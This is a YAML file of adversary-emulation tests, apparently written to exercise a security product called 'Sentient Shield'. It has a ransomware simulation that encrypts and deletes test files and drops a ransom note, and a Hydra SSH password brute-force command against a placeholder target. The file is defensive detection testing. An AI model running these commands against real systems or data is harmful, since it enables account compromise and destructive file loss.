# Atomic Red Team Test Scenarios for Sentient Shield

# T1486 - Data Encrypted for Impact (Ransomware)
ransomware_simulation:
  technique_id: T1486
  name: "Ransomware File Encryption Simulation"
  description: "Simulates ransomware behavior by encrypting files"
  platforms:
    - windows
    - linux
  commands:
    linux: |
      # Create test files
      mkdir -p /tmp/ransomware_test
      for i in {1..10}; do
        echo "Test file $i" > /tmp/ransomware_test/file_$i.txt
      done
      
      # Simulate encryption (using openssl)
      for file in /tmp/ransomware_test/*.txt; do
        openssl enc -aes-256-cbc -salt -in "$file" -out "$file.encrypted" -k "ransomware_key"
        rm "$file"
      done
      
      # Create ransom note
      echo "Your files have been encrypted!" > /tmp/ransomware_test/RANSOM_NOTE.txt
    
    windows: |
      # PowerShell ransomware simulation
      $testPath = "C:\\Temp\\ransomware_test"
      New-Item -ItemType Directory -Path $testPath -Force
      
      1..10 | ForEach-Object {
        "Test file $_" | Out-File "$testPath\\file_$_.txt"
      }
      
      Get-ChildItem $testPath -Filter *.txt | ForEach-Object {
        $content = Get-Content $_.FullName
        $encrypted = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($content))
        $encrypted | Out-File "$($_.FullName).encrypted"
        Remove-Item $_.FullName
      }

# T1110.001 - Brute Force: Password Guessing
brute_force_simulation:
  technique_id: T1110.001
  name: "SSH Brute Force Attack"
  description: "Simulates SSH brute force attack"
  platforms:
    - linux
  commands:
    linux: |
      # Using Hydra for brute force simulation
      hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://TARGET_IP -t 4
